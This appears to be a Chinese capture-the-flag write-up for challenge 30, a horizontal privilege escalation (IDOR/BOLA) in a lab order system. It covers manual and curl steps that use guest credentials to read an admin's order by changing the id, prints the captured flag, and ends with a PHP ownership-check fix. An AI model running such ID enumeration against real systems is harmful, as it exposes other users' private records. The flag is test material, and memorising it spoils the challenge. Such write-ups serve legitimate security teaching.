# 30 · IDOR 水平越权（订单系统）

> 靶机: `http://47.120.76.57:34938`　预置账号: `guest` / `guest123`
> Flag 位置: admin 的订单 `#1337` 备注字段

## 漏洞一句话

`/order?id=<n>` 详情接口**只判登录态，不校验订单归属**——拿 guest 的 cookie 改 id 就能读 admin 的订单。这就是 OWASP API Top 1 的 BOLA / 水平越权。

## 手工 5 步复刻

### Step 1. 打开靶机，访问 `/login`

```
http://47.120.76.57:34938/login
```

页面 input 的 `placeholder` 直接写着 `guest` / `guest123`（题目送的凭据）。

### Step 2. 登录

输入 `guest / guest123` → 提交 → 302 跳到 `/`，浏览器自动保存 `PHPSESSID` cookie。

### Step 3. 看自己的订单列表

```
http://47.120.76.57:34938/
```

只看到自己的 `#1001`、`#1002` 等订单，页脚提示：

> 订单号是自增的。

**两个信号**：① id 是整数可枚举　② 列表页做了 owner 过滤——但详情页未必。

### Step 4. 探针：换个 id 试试

地址栏直接改：

```
http://47.120.76.57:34938/order?id=1003
```

返回 `alice` 的笔记本订单——**越权确认**。

### Step 5. 直奔 admin 订单 #1337

```
http://47.120.76.57:34938/order?id=1337
```

响应：

```
订单 #1337
下单人: admin
商品: # 机密物料 #
金额: ¥0.01
备注: TOGOGO-flag{1c25b726-1cf9-44e8-8e34-7cf89e70e5bf}
```

## 命令行复刻（curl 版）

```bash
# 1. 登录并保存 cookie
curl -c /tmp/q30.ck -d 'username=guest&password=guest123' \
  http://47.120.76.57:34938/login

# 2. 越权读 admin 订单
curl -b /tmp/q30.ck "http://47.120.76.57:34938/order?id=1337"
```

## 一键脚本

```bash
python3 main.py
```

## 漏洞原理图

```
guest cookie ──► /order?id=1337
                     │
                     ├─ 检查 $_SESSION['user']  ✓ (登录了)
                     ├─ 取 $ORDERS[1337]         ✓ (存在)
                     └─ ❌ 漏掉: 校验 owner == 当前用户
                          ↓
                     直接吐出 admin 的订单内容
```

正确写法（修复）：

```php
$o = $ORDERS[$id] ?? null;
if (!$o || $o['user'] !== $_SESSION['user']) {
    http_response_code(404); exit('不存在');   // 返 404 而非 403，防枚举
}
```

## 拿到的 FLAG

```
TOGOGO-flag{1c25b726-1cf9-44e8-8e34-7cf89e70e5bf}
```

## 知识点速记

| 关键词 | 内容 |
| --- | --- |
| 漏洞类型 | IDOR / BOLA / 水平越权 |
| 触发条件 | 资源详情接口只判 authn 不判 authz |
| 识别特征 | URL 含自增 id、UUID、用户名等"对象指针" |
| Payload | 只有一个整数 `1337`（攻击面极小，杀伤极大） |
| 修复银弹 | WHERE id=? **AND owner=?** + 404 而不是 403 |
